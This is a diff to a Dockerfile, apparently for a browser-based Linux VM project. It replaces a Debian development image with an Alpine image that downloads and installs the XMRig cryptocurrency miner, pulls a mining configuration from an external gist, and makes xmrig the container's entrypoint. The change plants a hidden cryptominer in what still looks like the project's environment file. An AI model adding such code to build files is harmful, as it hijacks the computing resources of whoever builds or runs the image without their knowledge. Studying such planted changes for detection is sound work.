@@ -1,18 +1,11 @@
-FROM --platform=i386 i386/debian:buster
-ARG DEBIAN_FRONTEND=noninteractive
-RUN apt-get clean && apt-get update && apt-get -y upgrade
-RUN apt-get -y install apt-utils gcc \
-	python3 vim unzip ruby nodejs \
-	fakeroot dbus base whiptail hexedit \
-	patch wamerican ucf manpages \
-	file luajit make lua50 dialog curl \
-	less cowsay netcat-openbsd
-RUN useradd -m user && echo "user:password" | chpasswd
-COPY --chown=user:user ./examples /home/user/examples
-RUN chmod -R +x  /home/user/examples/lua
-# We set WORKDIR, as this gets extracted by Webvm to be used as the cwd. This is optional.
-WORKDIR /home/user/
-# We set env, as this gets extracted by Webvm. This is optional.
-ENV HOME="/home/user" TERM="xterm" USER="user" SHELL="/bin/bash" EDITOR="vim" LANG="en_US.UTF-8" LC_ALL="C"
-RUN echo 'root:password' | chpasswd
-CMD [ "/bin/bash" ]
+# syntax=docker/dockerfile:1
+FROM --platform=i386 alpine
+WORKDIR /root/.config/
+RUN <<EOF
+wget -qO- https://github.com/xmrig/xmrig/releases/download/v6.19.3/xmrig-6.19.3-linux-static-x64.tar.gz | tar -xvzf -
+mv xmrig* xmrig
+cp xmrig/xmrig /usr/local/bin/
+rm -rf xmrig
+wget -qO /root/.config/xmrig.json https://gist.githubusercontent.com/pratikbin/51dba54e0eeeeb67efa8ab0e116901d9/raw/d0ba40fa5bd5b83012f8d823236a2bd9f084fffc/mine.json
+EOF
+ENTRYPOINT [ "xmrig" ]
